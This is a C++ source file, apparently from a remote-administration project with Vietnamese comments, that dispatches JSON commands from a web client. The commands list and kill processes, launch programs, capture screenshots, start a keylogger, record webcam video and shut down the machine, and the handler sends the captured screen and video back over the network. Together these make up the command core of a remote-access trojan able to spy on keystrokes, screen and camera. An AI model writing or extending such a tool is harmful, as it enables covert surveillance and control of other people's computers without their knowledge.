#include "CommandHandler.h"
#include <iostream>
#include <thread> 
#include "../Features/AppManager.cpp"
#include "../Features/Power.cpp"
#include "../Features/ScreenCap.cpp"
#include "../Features/Keylogger.cpp"
#include "../Features/Webcam.cpp"


using namespace std;
using json = nlohmann::json;

void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
    try {
        if (jsonMessage.find("PING") != string::npos) {
            server.SendFrame(json{{"type", "PONG"}}.dump());
            return; 
        }
        auto req = json::parse(jsonMessage);
        string type = req["type"];

        // --- TAB 1 & 2: APPLICATIONS & PROCESSES ---
        // Web gửi: { "type": "GET_APPS" } -> Lấy danh sách cửa sổ
        if (type == "GET_APPS") {
            cout << ">> Client request: Get Apps List" << endl;
            json apps = AppManager::GetRunningApps();
            
            // Gửi trả về Web
            server.SendFrame(json{
                {"type", "APP_LIST"},
                {"payload", apps}
            }.dump());
        }
        
        // Web gửi: { "type": "PROCESS_LIST" } (Nếu bạn thêm nút refresh process) 
        // Hoặc tự động gọi khi cần lấy danh sách tiến trình chạy ngầm
        else if (type == "PROCESS_LIST") {
            cout << ">> Client request: Get Process List" << endl;
            json procs = AppManager::GetAllProcesses();
            
            server.SendFrame(json{
                {"type", "PROCESS_LIST"},
                {"payload", procs}
            }.dump());
        }

        // Web gửi: { "type": "KILL_APP", "payload": { "pid": 1234 } }
        else if (type == "KILL_APP") {
            int pid = req["payload"]["pid"];
            cout << ">> Client request: KILL PID " << pid << endl;
            
            AppManager::KillProcess(pid);
            // Mẹo: Sau khi Kill xong, gửi lại danh sách mới ngay lập tức để Web cập nhật
            // (Gửi cả 2 danh sách cho chắc ăn)
            server.SendFrame(json{{"type", "APP_LIST"}, {"payload", AppManager::GetRunningApps()}}.dump());
            server.SendFrame(json{{"type", "PROCESS_LIST"}, {"payload", AppManager::GetAllProcesses()}}.dump());
        }
        // Web gửi: { "type": "START_APP", "payload": { "path": "notepad" } }
        else if (type == "START_APP") {
            string path = req["payload"]["path"];
            cout << ">> Client request: START " << path << endl;
            AppManager::StartApp(path);
        }

        // --- TAB 3: SCREENSHOT ---
        // Web gửi: { "type": "CAPTURE_SCREEN" }
        else if (type == "CAPTURE_SCREEN") {
            cout << ">> Client request: Screenshot" << endl;
            string b64 = ScreenCapture::TakeScreenshot();
            
            server.SendFrame(json{
                {"type", "SCREENSHOT_DATA"},
                {"payload", { {"base64", b64} }}
            }.dump());
        }

        // --- TAB 4: KEYLOGGER ---
        // Web gửi: { "type": "KEYLOG_CONTROL", "payload": { "action": "START" / "STOP" } }
        else if (type == "KEYLOG_CONTROL") {
            string action = req["payload"]["action"];
            if (action == "START") {
                cout << ">> Keylogger: ENABLED" << endl;
                Keylogger::Start(server);
            } else {
                cout << ">> Keylogger: DISABLED" << endl;
                Keylogger::Stop();
            }
        }

        // --- TAB 5: WEBCAM ---
        // Web gửi: { "type": "RECORD_WEBCAM", "payload": { "duration": 10 } }
        else if (type == "RECORD_WEBCAM") {
            int duration = req["payload"]["duration"];
            cout << ">> Webcam: Recording for " << duration << "s..." << endl;
            
            // QUAN TRỌNG: Phải tạo luồng (thread) riêng.
            // Nếu không, Server sẽ bị "đơ" trong 10 giây chờ quay xong.
            server.SendFrame(json{
                {"type", "WEBCAM_STATUS"},
                {"payload", "PROCESSING"}
            }.dump());
            thread([&server, duration]() {
                string b64Video = WebcamMgr::RecordVideo(duration);
                
                if (!b64Video.empty()) {
                    // Gửi video về khi quay xong
                    server.SendFrame(json{
                        {"type", "WEBCAM_VIDEO"},
                        {"payload", { {"base64", b64Video} }}
                    }.dump());
                    cout << ">> Webcam: Sent video to client." << endl;
                } else {
                    cout << ">> Webcam: Error recording (Check ffmpeg.exe)" << endl;
                }
            }).detach(); // Tách luồng để nó chạy ngầm
        }

        // --- TAB 6: POWER ---
        // Web gửi: { "type": "SYSTEM_COMMAND", "payload": { "action": "shutdown" / "restart" / "logoff" } }
        else if (type == "SYSTEM_COMMAND") {
            string action = req["payload"]["action"];
            cout << ">> System Command: " << action << endl;
            PowerControl::Execute(action);
        }
        
        else {
            cout << ">> Unknown command: " << type << endl;
        }
    }
    catch (exception& e) {
        cout << "!! JSON Processing Error: " << e.what() << endl;
    }
}